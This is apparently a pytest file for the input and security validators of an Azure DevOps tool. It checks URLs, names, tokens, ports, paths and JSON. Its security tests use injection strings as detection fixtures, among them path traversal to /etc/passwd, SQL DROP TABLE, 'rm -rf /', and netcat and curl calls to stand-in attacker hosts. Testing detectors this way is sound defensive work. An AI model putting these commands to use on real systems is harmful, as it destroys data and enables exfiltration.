"""Tests for input validation utilities."""

import pytest

from src.validators import InputValidator, SecurityValidator


class TestInputValidator:
    """Test input validation utilities."""

    def test_validate_azure_org_url_valid(self):
        """Test validation of valid Azure DevOps organization URLs."""
        valid_urls = [
            "https://dev.azure.com/myorg",
            "https://dev.azure.com/my-org",
            "https://dev.azure.com/myorg123",
            "https://dev.azure.com/a",
            "https://dev.azure.com/my-org/",
        ]
        
        for url in valid_urls:
            is_valid, message = InputValidator.validate_azure_org_url(url)
            assert is_valid, f"URL {url} should be valid: {message}"

    def test_validate_azure_org_url_invalid(self):
        """Test validation of invalid Azure DevOps organization URLs."""
        invalid_urls = [
            "",
            None,
            "https://github.com/myorg",
            "http://dev.azure.com/myorg",
            "https://dev.azure.com/",
            "https://dev.azure.com/my org",
            "https://dev.azure.com/my@org",
            "ftp://dev.azure.com/myorg",
            "https://dev.azure.com/" + "a" * 100,  # Too long
        ]
        
        for url in invalid_urls:
            is_valid, message = InputValidator.validate_azure_org_url(url)
            assert not is_valid, f"URL {url} should be invalid"

    def test_validate_project_name_valid(self):
        """Test validation of valid project names."""
        valid_names = [
            "myproject",
            "my-project",
            "my_project",
            "Project123",
            "a",
            "test-project_2024",
        ]
        
        for name in valid_names:
            is_valid, message = InputValidator.validate_project_name(name)
            assert is_valid, f"Project name {name} should be valid: {message}"

    def test_validate_project_name_invalid(self):
        """Test validation of invalid project names."""
        invalid_names = [
            "",
            None,
            "my project",  # Space
            "my@project",  # Special character
            "my.project",  # Dot
            "my/project",  # Slash
            "a" * 100,     # Too long
        ]
        
        for name in invalid_names:
            is_valid, message = InputValidator.validate_project_name(name)
            assert not is_valid, f"Project name {name} should be invalid"

    def test_validate_pat_token_valid(self):
        """Test validation of valid PAT tokens."""
        valid_tokens = [
            "a" * 20,  # Minimum length
            "abcdefghijklmnopqrstuvwxyz123456",
            "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=",  # Base64-like
        ]
        
        for token in valid_tokens:
            is_valid, message = InputValidator.validate_pat_token(token)
            assert is_valid, f"PAT token should be valid: {message}"

    def test_validate_pat_token_invalid(self):
        """Test validation of invalid PAT tokens."""
        invalid_tokens = [
            "",
            None,
            "short",       # Too short
            "a" * 19,      # Just under minimum
            "a" * 101,     # Too long
            "token with spaces",
            "token@with#special!chars",
        ]
        
        for token in invalid_tokens:
            is_valid, message = InputValidator.validate_pat_token(token)
            assert not is_valid, f"PAT token {token} should be invalid"

    def test_validate_days_back_valid(self):
        """Test validation of valid days_back values."""
        valid_values = [
            1,
            30,
            365,
            "30",
            "365",
        ]
        
        for value in valid_values:
            is_valid, message, result = InputValidator.validate_days_back(value)
            assert is_valid, f"Days back {value} should be valid: {message}"
            assert isinstance(result, int)
            assert result > 0

    def test_validate_days_back_invalid(self):
        """Test validation of invalid days_back values."""
        invalid_values = [
            0,
            -1,
            3651,      # Too large
            "invalid",
            None,
            [],
        ]
        
        for value in invalid_values:
            is_valid, message, result = InputValidator.validate_days_back(value)
            assert not is_valid, f"Days back {value} should be invalid"

    def test_validate_port_valid(self):
        """Test validation of valid port numbers."""
        valid_ports = [
            1024,
            8000,
            8080,
            65535,
            "8000",
        ]
        
        for port in valid_ports:
            is_valid, message, result = InputValidator.validate_port(port)
            assert is_valid, f"Port {port} should be valid: {message}"
            assert isinstance(result, int)
            assert result > 0

    def test_validate_port_invalid(self):
        """Test validation of invalid port numbers."""
        invalid_ports = [
            0,
            -1,
            65536,     # Too large
            "invalid",
            None,
        ]
        
        for port in invalid_ports:
            is_valid, message, result = InputValidator.validate_port(port)
            assert not is_valid, f"Port {port} should be invalid"

    def test_validate_file_path_valid(self):
        """Test validation of valid file paths."""
        valid_paths = [
            "data/test.json",
            "config/config.json",
            "test_file.txt",
        ]
        
        for path in valid_paths:
            is_valid, message = InputValidator.validate_file_path(path)
            assert is_valid, f"File path {path} should be valid: {message}"

    def test_validate_file_path_invalid(self):
        """Test validation of invalid file paths."""
        invalid_paths = [
            "",
            "../../../etc/passwd",  # Path traversal
            "../../config.json",    # Path traversal
            "/etc/passwd",          # Absolute path outside project
        ]
        
        for path in invalid_paths:
            is_valid, message = InputValidator.validate_file_path(path)
            assert not is_valid, f"File path {path} should be invalid"

    def test_validate_json_data_valid(self):
        """Test validation of valid JSON data."""
        test_cases = [
            ('{"key": "value"}', dict),
            ('[1, 2, 3]', list),
            ('"string"', str),
            ('null', type(None)),
            ('{"nested": {"object": true}}', dict),
        ]
        
        for json_str, expected_type in test_cases:
            is_valid, message, data = InputValidator.validate_json_data(json_str)
            assert is_valid, f"JSON should be valid: {message}"
            assert isinstance(data, expected_type), f"Expected {expected_type}, got {type(data)}"

    def test_validate_json_data_invalid(self):
        """Test validation of invalid JSON data."""
        invalid_json = [
            "",
            "invalid json",
            "{key: 'value'}",  # Unquoted key
            "{'key': 'value'}",  # Single quotes
            "{",  # Incomplete
        ]
        
        for json_str in invalid_json:
            is_valid, message, data = InputValidator.validate_json_data(json_str)
            assert not is_valid, f"JSON {json_str} should be invalid"

    def test_sanitize_string(self):
        """Test string sanitization."""
        test_cases = [
            ("normal string", "normal string"),
            ("string\x00with\x01nulls", "stringwithnulls"),
            ("  whitespace  ", "whitespace"),
            ("string\nwith\ttabs", "string\nwith\ttabs"),  # Preserve allowed whitespace
            ("a" * 300, "a" * 255),  # Truncate long strings
        ]
        
        for input_str, expected in test_cases:
            result = InputValidator.sanitize_string(input_str)
            assert result == expected

    def test_validate_work_item_data_valid(self):
        """Test validation of valid work item data."""
        valid_item = {
            "id": "123",
            "title": "Test Work Item",
            "type": "User Story",
            "current_state": "Active",
            "created_date": "2024-01-01T00:00:00Z",
        }
        
        is_valid, message = InputValidator.validate_work_item_data(valid_item)
        assert is_valid, f"Work item should be valid: {message}"

    def test_validate_work_item_data_invalid(self):
        """Test validation of invalid work item data."""
        invalid_items = [
            {},  # Missing all fields
            {"id": "123"},  # Missing other required fields
            {
                "id": "123",
                "title": "",  # Empty title
                "type": "User Story",
                "current_state": "Active",
                "created_date": "2024-01-01T00:00:00Z",
            },
            {
                "id": "123",
                "title": "a" * 600,  # Title too long
                "type": "User Story",
                "current_state": "Active",
                "created_date": "2024-01-01T00:00:00Z",
            },
            {
                "id": "123",
                "title": "Test",
                "type": "User Story",
                "current_state": "Active",
                "created_date": "invalid date",  # Invalid date
            },
        ]
        
        for item in invalid_items:
            is_valid, message = InputValidator.validate_work_item_data(item)
            assert not is_valid, f"Work item should be invalid: {item}"

    def test_validate_config_data(self):
        """Test configuration data validation."""
        valid_config = {
            "azure_devops": {
                "org_url": "https://dev.azure.com/myorg",
                "default_project": "my-project",
            },
            "data_management": {
                "data_directory": "data",
            },
        }
        
        errors = InputValidator.validate_config_data(valid_config)
        assert len(errors) == 0, f"Valid config should have no errors: {errors}"

        invalid_config = {
            "azure_devops": {
                "org_url": "invalid-url",
                "default_project": "invalid project name",
            },
        }
        
        errors = InputValidator.validate_config_data(invalid_config)
        assert len(errors) > 0, "Invalid config should have errors"


class TestSecurityValidator:
    """Test security validation utilities."""

    def test_check_for_injection_patterns_sql(self):
        """Test detection of SQL injection patterns."""
        sql_injection_patterns = [
            "' or '1'='1",
            "'; DROP TABLE users; --",
            "UNION SELECT * FROM passwords",
            "INSERT INTO users VALUES",
        ]
        
        for pattern in sql_injection_patterns:
            threats = SecurityValidator.check_for_injection_patterns(pattern)
            assert len(threats) > 0, f"Should detect SQL injection in: {pattern}"

    def test_check_for_injection_patterns_command(self):
        """Test detection of command injection patterns."""
        command_injection_patterns = [
            "; rm -rf /",
            "| nc attacker.com 1234",
            "&& curl evil.com",
            "$(malicious command)",
            "`dangerous command`",
        ]
        
        for pattern in command_injection_patterns:
            threats = SecurityValidator.check_for_injection_patterns(pattern)
            assert len(threats) > 0, f"Should detect command injection in: {pattern}"

    def test_check_for_injection_patterns_clean(self):
        """Test that clean input doesn't trigger false positives."""
        clean_inputs = [
            "normal text",
            "user@example.com",
            "file.txt",
            "some-project-name",
        ]
        
        for clean_input in clean_inputs:
            threats = SecurityValidator.check_for_injection_patterns(clean_input)
            assert len(threats) == 0, f"Clean input should not trigger threats: {clean_input}"

    def test_validate_host_binding_safe(self):
        """Test validation of safe host bindings."""
        safe_hosts = [
            "127.0.0.1",
            "localhost",
        ]
        
        for host in safe_hosts:
            is_valid, message = SecurityValidator.validate_host_binding(host)
            assert is_valid, f"Host {host} should be safe: {message}"

    def test_validate_host_binding_warning(self):
        """Test validation of host binding with warning."""
        is_valid, message = SecurityValidator.validate_host_binding("0.0.0.0")
        assert is_valid, "0.0.0.0 should be valid"
        assert "WARNING" in message, "Should warn about 0.0.0.0"

    def test_validate_host_binding_unsafe(self):
        """Test validation of unsafe host bindings."""
        unsafe_hosts = [
            "",
            "192.168.1.1",
            "example.com",
            "0.0.0.1",
        ]
        
        for host in unsafe_hosts:
            is_valid, message = SecurityValidator.validate_host_binding(host)
            assert not is_valid, f"Host {host} should be unsafe"